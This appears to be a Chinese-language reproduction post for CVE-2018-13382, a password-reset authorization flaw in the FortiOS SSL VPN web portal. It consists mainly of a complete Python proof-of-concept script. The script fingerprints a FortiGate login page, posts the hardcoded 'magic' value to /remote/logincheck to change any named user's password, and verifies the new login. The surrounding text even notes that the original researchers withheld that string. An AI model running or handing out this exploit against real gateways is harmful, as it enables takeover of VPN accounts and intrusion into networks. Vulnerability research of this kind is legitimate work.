# （CVE-2018-13382）Fortinet FortiOS magic后门

> 原文：[https://www.zhihuifly.com/t/topic/2948](https://www.zhihuifly.com/t/topic/2948)

# （CVE-2018-13382）Fortinet FortiOS magic后门

## 一、漏洞简介

Fortinet FortiOS是美国飞塔（Fortinet）公司的一套专用于FortiGate网络安全平台上的安全操作系统。该系统为用户提供防火墙、防病毒、IPSec/SSLVPN、Web内容过滤和反垃圾邮件等多种安全功能。 Fortinet FortiOS 6.0.0版本至6.0.4版本 、5.6.0版本至5.6.8版本和5.4.1版本至5.4.10版本中的SSL VPN Web门户存在授权问题漏洞。该漏洞源于网络系统或产品中缺少身份验证措施或身份验证强度不足。

## 二、漏洞影响

Fortinet Fortios 6.2 Fortinet Fortios 6.0.5 Fortinet Fortios 5.6.9 Fortinet Fortios 5.4.11

## 三、复现过程

在登录页面中，我们找到了一个的特殊参数`magic`。一旦这个参数为某个特殊字符串，我们就可以修改任何用户的密码。

![image](img/9a5b0e2e151d1fcdc36b7a30b92f5cb8.png)

根据我们的调查，仍有大量的Fortigate SSL VPN缺少补丁。因此，考虑到其严重性，我们不会透露magic字符串。但是，[CodeWhite的研究人员](https://twitter.com/codewhitesec/status/1145967317672714240)已经复现了这个漏洞。毫无疑问，其他攻击者很快就会利用此漏洞！请尽快更新您的Fortigate！

> Critical vulns in [#FortiOS](https://twitter.com/hashtag/FortiOS?src=hash&ref_src=twsrc%5Etfw) reversed & exploited by our colleagues [@niph_](https://twitter.com/niph_?ref_src=twsrc%5Etfw) and [@ramoliks](https://twitter.com/ramoliks?ref_src=twsrc%5Etfw) - patch your [#FortiOS](https://twitter.com/hashtag/FortiOS?src=hash&ref_src=twsrc%5Etfw) asap and see the [#bh2019](https://twitter.com/hashtag/bh2019?src=hash&ref_src=twsrc%5Etfw) talk of [@orange_8361](https://twitter.com/orange_8361?ref_src=twsrc%5Etfw) and [@mehqq_](https://twitter.com/mehqq_?ref_src=twsrc%5Etfw) for details (tnx guys for the teaser that got us started) [pic.twitter.com/TLLEbXKnJ4](https://t.co/TLLEbXKnJ4)
> 
> — Code White GmbH (@codewhitesec) [2019年7月2日](https://twitter.com/codewhitesec/status/1145967317672714240?ref_src=twsrc%5Etfw)

### poc

https://github.com/ianxtianxt/CVE-2018-13382

```
$ python CVE-2018-13382.py  -h
Usage: CVE-2018-13382.py [options]

Options:

-h, --help   show this help message and exit

-i IP        e.g. 127.0.0.1:10443

-u USERNAME

-p PASSWORD 
```

```
import requests, binascii, optparse, sys
from urlparse import urlparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()
import multiprocessing
import colored
from user_agent import generate_user_agent, generate_navigator
bold=True

userAgent=generate_user_agent()
username=""
newpassword=""
ip=""

def setColor(message, bold=False, color=None, onColor=None):
	from termcolor import colored, cprint
	retVal = colored(message, color=color, on_color=onColor, attrs=("bold",))
	return retVal

def checkIP(ip):
	try:
		url = "https://"+ip+"/remote/login?lang=en"
		headers = {"User-Agent": userAgent, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
		r=requests.get(url, headers=headers, verify=False)
		if r.status_code==200 and "<title>Please Login</title>" in r.text:
			return True
		else:
			return False
	except requests.exceptions.ConnectionError as e:
		print e
		return False

def changePassword(ip,username,newpassword):
	url = "https://"+ip+"/remote/logincheck"
	headers = {"User-Agent": userAgent, "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://"+ip+"/remote/login?lang=en", "Pragma": "no-cache", "Cache-Control": "no-store, no-cache, must-revalidate", "If-Modified-Since": "Sat, 1 Jan 2000 00:00:00 GMT", "Content-Type": "text/plain;charset=UTF-8", "Connection": "close"}
	data = {"ajax": "1", "username": username, "realm": '', "credential": newpassword, "magic": "4tinet2095866", "reqid": "0", "credential2": newpassword}
	r=requests.post(url, headers=headers, data=data, verify=False)
	if r.status_code==200 and 'redir=/remote/hostcheck_install' in r.text:
		return True
	else:
		return False

def testLogin(ip,username,newpassword):
	url = "https://"+ip+"/remote/logincheck"
	headers = {"User-Agent": userAgent, "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://"+ip+"/remote/login?lang=en", "Pragma": "no-cache", "Cache-Control": "no-store, no-cache, must-revalidate", "If-Modified-Since": "Sat, 1 Jan 2000 00:00:00 GMT", "Content-Type": "text/plain;charset=UTF-8", "Connection": "close"}
	data = {"ajax": "1", "username": username, "realm": '', "credential": newpassword}
	r=requests.post(url, headers=headers, data=data, verify=False)
	if r.status_code==200 and"redir=/remote/hostcheck_install" in r.text:
			return True
	else:
		return False

parser = optparse.OptionParser()
parser.add_option('-i', action="store", dest="ip", help="e.g. 127.0.0.1:10443")
parser.add_option('-u', action="store", dest="username")
parser.add_option('-p', action="store", dest="password")
options, remainder = parser.parse_args()
if not options.username or not options.password or not options.ip:
	print "[!] Please provide the ip (-i), username (-u) and password (-p)"
	sys.exit()
if options.username:
	username=options.username
if options.password:
	newpassword=options.password
if options.ip:
	ip=options.ip
tmpStatus=checkIP(ip)
if tmpStatus==True:
	print "[*] Checking if target is a Fortigate device "+setColor(" [OK]", bold, color="green")
	if changePassword(ip,username,newpassword)==True:
		print "[*] Using the magic keyword to change password for: ["+username+"]"+setColor(" [OK]", bold, color="green")	
		if testLogin(ip,username,newpassword)==True:
			print "[*] Testing new credentials ["+username+"|"+newpassword+"] "+setColor(" [OK]", bold, color="green")
			print "************** Enjoy your new credentials **************\n"
		else:
			print "[*] Testing new credentials ["+username+"|"+newpassword+"] "+setColor(" [NOK]", bold, color="red")
	else:
		print "[*] Using the magic keyword to change password for: ["+username+"]"+setColor(" [NOK]", bold, color="red")			
else:
	print "[*] Checking if target is a Fortigate device "+setColor(" [NOK]", bold, color="red") 
```